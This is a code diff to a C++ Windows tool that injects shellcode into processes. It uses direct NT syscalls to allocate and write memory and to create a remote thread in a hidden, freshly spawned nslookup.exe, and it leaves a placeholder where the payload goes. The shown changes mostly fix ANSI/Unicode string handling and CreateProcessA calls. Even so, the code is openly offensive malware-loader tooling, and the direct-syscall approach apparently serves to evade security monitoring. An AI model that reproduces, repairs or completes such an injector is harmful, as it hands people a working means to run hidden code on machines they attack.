@@ -1,5 +1,5 @@
 #include <iostream>
-#include "Windows.h"
+#include "windows.h"
 #include "winternl.h"
 #include "getSyscall.h"
 #include <fstream>
@@ -9,6 +9,7 @@
 #include <string>
 #include <fstream>
 #include <sstream>
+#define UNICODE 1
 #pragma comment(lib, "ntdll")
 
 /* put your shellcode here, I'll eventually add a command line option to read in shellcode from file */
@@ -61,7 +62,7 @@ int injectShellcode(BOOL spawnProc, int PID, BOOL unsafe) {
 	LPVOID allocation_start;
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
-	LPCWSTR cmd;
+	LPCSTR cmd;
 	myNtAllocateVirutalMemory NtAllocateVirtualMemory;
 	myNtWriteVirtualMemory NtWriteVirtualMemory;
 	myNtCreateThreadEx NtCreateThreadEx;
@@ -78,9 +79,10 @@ int injectShellcode(BOOL spawnProc, int PID, BOOL unsafe) {
 		ZeroMemory(&si, sizeof(si));
 		ZeroMemory(&pi, sizeof(pi));
 		si.cb = sizeof(si);
-		cmd = TEXT("C:\\Windows\\System32\\nslookup.exe");
+		//cmd = TEXT("C:\\Windows\\System32\\nslookup.exe");
+		cmd = "C:\\Windows\\System32\\nslookup.exe";
 
-		if (!CreateProcess(
+		if (!CreateProcessA(
 			cmd,							// Executable
 			NULL,							// Command line
 			NULL,							// Process handle not inheritable
@@ -89,7 +91,7 @@ int injectShellcode(BOOL spawnProc, int PID, BOOL unsafe) {
 			CREATE_NO_WINDOW,	            // Do Not Open a Window
 			NULL,							// Use parent's environment block
 			NULL,							// Use parent's starting directory 
-			&si,			                // Pointer to STARTUPINFO structure
+			(LPSTARTUPINFOA) &si,			                // Pointer to STARTUPINFO structure
 			&pi								// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
 		)) {
 			DWORD errval = GetLastError();
